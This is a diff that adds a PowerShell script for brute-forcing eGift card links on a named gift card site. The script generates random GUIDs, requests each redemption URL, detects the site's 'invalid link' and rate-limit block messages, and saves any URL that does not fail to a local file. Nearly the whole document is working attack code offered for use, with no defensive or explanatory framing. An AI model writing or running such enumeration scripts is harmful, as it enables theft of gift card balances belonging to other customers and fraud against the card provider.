@@ -1,0 +1,52 @@
+# Parameters
+$baseUrl = "https://egiftpost.com/g/Default.aspx?Codes="
+$failureText = "The gift link is invalid. Please check the link and try again."
+$blockText = "You have made too many invalid attempts to access an eGift Card URL."
+$outputFile = "C:\valid_urls.txt"
+
+# Ensure the output file is clean
+if (Test-Path $outputFile) {
+    Remove-Item $outputFile
+}
+
+# Function to generate random GUIDs
+function Generate-GUID {
+    [guid]::NewGuid().ToString()
+}
+
+# Loop to brute-force GUIDs
+for ($i = 0; $i -lt 1000; $i++) {
+    # Adjust the iteration count as needed
+    $guid = Generate-GUID
+    $url = "$baseUrl$guid"
+
+    Write-Host "Testing URL: $url" -ForegroundColor Cyan
+
+    try {
+        # Make the web request
+        $response = Invoke-WebRequest -Uri $url -ErrorAction Stop
+        $content = $response.Content
+
+        # Check if the server is blocking further attempts
+        if ($content -like "*$blockText*") {
+            Write-Host "Server has blocked further attempts: $blockText" -ForegroundColor Magenta
+            Write-Host "Stopping script execution." -ForegroundColor Red
+            break
+        }
+
+        # Check for failure text
+        if ($content -like "*$failureText*") {
+            Write-Host "Failed: $url" -ForegroundColor Red
+        }
+        else {
+            Write-Host "Success: $url" -ForegroundColor Green
+            # Log the valid URL to the output file
+            Add-Content -Path $outputFile -Value $url
+        }
+    }
+    catch {
+        Write-Host "Error accessing $url $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+}
+
+Write-Host "Brute force attempt completed. Check '$outputFile' for valid URLs." -ForegroundColor Green
